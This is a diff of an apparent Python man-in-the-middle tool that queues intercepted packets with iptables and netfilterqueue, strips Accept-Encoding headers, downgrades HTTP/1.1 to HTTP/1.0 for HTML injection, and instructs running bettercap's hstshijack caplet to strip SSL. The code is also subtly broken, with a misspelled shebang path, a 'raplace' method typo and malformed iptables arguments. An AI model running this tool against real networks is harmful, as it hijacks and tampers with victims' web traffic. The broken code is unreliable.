@@ -1,5 +1,13 @@
 #!/sur/bin/env python3
 
+"""
+To ssl strip frist run on terminal:
+bettercap -iface eth0 -caplet hstshijack/hstshijack
+
+To start the server run on terminal:
+service apache2 start
+"""
+
 import subprocess
 import netfilterqueue
 import scapy.all as scapy
@@ -10,7 +18,8 @@ import re
 from scapy.layers.inet import IP, TCP
 
 subprocess.run('iptables --flush', shell=True)
-subprocess.run('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+subprocess.run('iptables -I INPUT-j NFQUEUE --queue-num 0', shell=True)
+subprocess.run('iptables -I OUTPUT-j NFQUEUE --queue-num 0', shell=True)
 # Enabling port forwarding
 subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
 
@@ -34,14 +43,19 @@ def process_packet(packet):
             # mean that this characters are not html code, so we'll do a try except
             # to deal with this issue so only the packet with html will be modified
             load = scapy_packet[scapy.Raw].load.decode()
-            if scapy_packet[scapy.TCP].dport == 80:
+            if scapy_packet[scapy.TCP].dport == 8080:
                 print("[+] Request")
                 # Now we'll replace the encoding line with nothing so the server
                 # will think that we don't understand any kind of encoding and
                 # it will send the plain html code
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+                # HTTP/1.1 supports chunks data transfer, so the data is sent in
+                # chunks, each chunk having the same size, so if we change the size
+                # of a packet, the page won't load properly. That's why we'll
+                # downgrade HTTP/1.1 to HTTP/1.0
+                load = load.raplace("HTTP/1.1", "HTTP/1.0")
 
-            elif scapy_packet[scapy.TCP].sport == 80:
+            elif scapy_packet[scapy.TCP].sport == 8080:
                 print("[+] Response")
                 # print(scapy_packet.show())
                 # injection_code = "<script>alert('IRONJAQUEEEERRRRR Pringao, te han jaqueao');</script>"
